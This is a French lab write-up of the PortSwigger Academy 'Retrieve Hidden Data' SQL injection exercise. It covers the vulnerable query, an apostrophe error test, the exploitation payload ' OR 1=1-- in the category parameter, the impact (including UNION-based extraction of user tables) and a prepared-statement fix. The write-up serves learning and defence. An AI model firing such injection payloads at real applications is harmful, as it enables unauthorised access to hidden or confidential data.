# SQLi 01 — Retrieve Hidden Data

**Plateforme :** PortSwigger Academy  
**Catégorie :** SQL Injection  
**Niveau :** Apprentice  
**Date :** 15/06/2026  

---

## Objectif

L'application affiche des produits filtrés par catégorie. L'objectif est d'afficher
tous les produits, y compris ceux que la boutique n'a pas publiés.

---

## Vulnérabilité identifiée

Le paramètre `category` dans l'URL atterrit directement dans une requête SQL sans
aucun filtrage. Ce que l'utilisateur envoie est exécuté tel quel par la base de données.


```sql
SELECT * FROM products WHERE category = 'INPUT' AND released = 1
```

Ici, l'utilisateur contrôle entièrement `INPUT`.

---

## Reconnaissance

URL observée dans Burp Suite :
GET /filter?category==Corporate+gifts HTTP/1.1

Test d'injection avec une apostrophe pour provoquer une erreur SQL :
/filter?category=Corporate+gifts'

Réponse : erreur 500 / Internal Server Error, cela confirme que l'entrée est interprétée comme du SQL.

---

## Exploitation

**Payload utilisé :**
/filter?category=Corporate+gifts%27+OR+1=1--

**Requête SQL résultante :**

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

- `'` ferme la chaîne de caractères
- `--` commente tout le reste de la requête
- `OR 1=1` est toujours vrai donc toutes les lignes de la table sont retournées.
- Les produits cachés apparaissent.

---

## Résultat

Les produits cachés sont affichés.

---

## Impact

En conditions réelles, cette vulnérabilité permettrait de :

- Accéder à des données confidentielles ou non publiées
- Contourner des filtres de visibilité.
- En combinant avec UNION : extraire d'autres tables (utilisateurs, mots de passe)

---

## Remédiation

Le problème est simple que la requête est construite en concaténant directement
l'entrée utilisateur. On doit donc corriger cela en utilisant des
**requêtes préparées**. Le paramètre doit être une donnée et pas du code.

```python
# Vulnérable
query = "SELECT * FROM products WHERE category = '" + category + "'"

# Corrigé
cursor.execute("SELECT * FROM products WHERE category = ?", (category,))
```

---

## Références

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)